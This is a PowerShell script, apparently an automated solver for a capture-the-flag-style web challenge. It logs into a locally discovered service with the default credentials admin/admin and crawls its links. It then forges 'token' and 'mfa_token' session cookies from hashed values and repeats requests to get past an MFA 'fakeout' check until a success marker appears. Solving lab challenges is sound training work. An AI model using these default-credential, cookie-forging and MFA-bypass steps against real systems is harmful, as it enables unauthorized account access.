$ip = netstat -an | Select-String -Pattern "TCP|UDP" | Select-String -pattern "listen" | ForEach-Object { ($_ -split "\s+")[3] } | ForEach-Object { ($_ -split ":")[0] } 
$port = netstat -an | Select-String -Pattern "TCP|UDP" | Select-String -pattern "listen" | ForEach-Object { ($_ -split "\s+")[3] } | ForEach-Object { ($_ -split ":")[1] } 
$baseuri = "http://${ip}:${port}"

$user = "admin"
$pass = "admin" | ConvertTo-SecureString -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($user, $pass)

$resp = Invoke-WebRequest -Uri $baseuri -AllowUnencryptedAuthentication -Credential $credential

$links = $resp.Links | Select-Object -ExpandProperty href
$endpoint = $null

foreach ($link in $links) {

    $endpoint = $link -replace '^http://[^/]+', ''
    $outputFile = $endpoint -replace '/' , ''
    $response = Invoke-WebRequest -Uri $link
    $response.Content | Out-File -FilePath $outputFile
    
}

$resp = Invoke-WebRequest -Uri "$baseuri$endpoint" -AllowUnencryptedAuthentication -Credential $credential

$csv_endpoint = $resp.Content | Select-String -Pattern "http://[^\s]+\.csv" | ForEach-Object { $_.Matches.Value } | ForEach-Object { $_ -replace '^http://[^/]+', '' } | Select-Object -First 1

$resp = Invoke-WebRequest -Uri "$baseuri$csv_endpoint" -AllowUnencryptedAuthentication -Credential $credential
$redacted_endpoints = $resp.Content -split "`n" | Where-Object { $_ -match "^[a-f0-9]{32},REDACTED" }

$verification_endpoint = $resp.Content -split "\s+" | Where-Object { $_ -match "^http://([^/]+/)+" } | ForEach-Object { $_ -replace '^http://[^/]+', '' }

foreach ($endpoint in $redacted_endpoints) {

    $md5 = $endpoint.Substring(0, 32)
    $outputFile = $md5
    $md5 | Out-File -FilePath $outputFile

    $sha256 = (Get-FileHash -Path $outputFile -Algorithm SHA256).Hash
 

    $redacted_endpoint = $verification_endpoint -replace "<sha256sum>", $sha256

    $webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession

    $cookie = New-Object System.Net.Cookie("token", $md5, "/", $baseuri.split("//")[1].split(":")[0])
    $webSession.Cookies.Add($cookie);

    $resp = Invoke-WebRequest -Uri "$baseuri$redacted_endpoint" -AllowUnencryptedAuthentication -Credential $credential -WebSession $webSession
   
    $mfa_token = $resp.Links | Select-Object -ExpandProperty href
    $mfa_endpoint = $resp.Links | Select-Object -ExpandProperty outerHTML | ForEach-Object { $_ -replace '<a[^>]*>(.*?)</a>', '$1' };
  
    $cookie2 = New-Object System.Net.Cookie("mfa_token", $mfa_token, "/", $baseuri.split("//")[1].split(":")[0]);
    $webSession.Cookies.Add($cookie2)
   
    $threshold = ($resp.Content -split '<br>' | Where-Object { $_ -match 'fakeout threshold set to (\d+)' } | ForEach-Object { $Matches[1] })

    for ($i = 0; $i -le [int]$threshold; $i++) {
       
        $resp = Invoke-WebRequest -Uri "$baseuri$mfa_endpoint" -AllowUnencryptedAuthentication -Credential $credential -WebSession $webSession
      
        if ($resp.Content -match '\[\+\]') {
            
            $resp.Content
            break
          

        }

    }
     
}